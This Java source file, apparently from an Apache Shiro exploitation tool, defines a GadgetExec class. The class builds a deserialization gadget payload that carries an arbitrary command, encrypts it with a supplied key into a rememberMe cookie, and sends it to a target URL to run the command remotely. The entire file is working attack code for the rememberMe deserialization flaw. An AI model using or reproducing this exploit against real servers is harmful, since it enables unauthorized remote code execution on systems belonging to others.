package core.scan;

import core.conn.ShiroHttpConnection;
import core.payload.ObjectPayload;
import core.scan.eneity.ShiroTarget;
import core.util.Payload;
import core.util.Util;

/**
 * To exec command
 * Need: base, key, command, gadget
 */
public class GadgetExec implements ShiroScanner {

    private final ShiroTarget target;

    public GadgetExec(ShiroTarget target) {
        this.target = target;
    }

    @Override
    public void scan() throws Exception {
        ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
        Class<?> clazz = Payload.getPayloadClass(target.getGadget());
        ObjectPayload payload = (ObjectPayload) clazz.newInstance();
        byte[] serialize = Util.serialize(payload.getObjectPayload(target.getCommand()));
        System.out.println("[+] Send Gadget: " + clazz.getSimpleName() + " | Use Command: " + target.getCommand());
        String rememberMe = Util.getRememberMe(serialize, target.getKey());
        connection.sendRememberMe(rememberMe, false);
    }
}
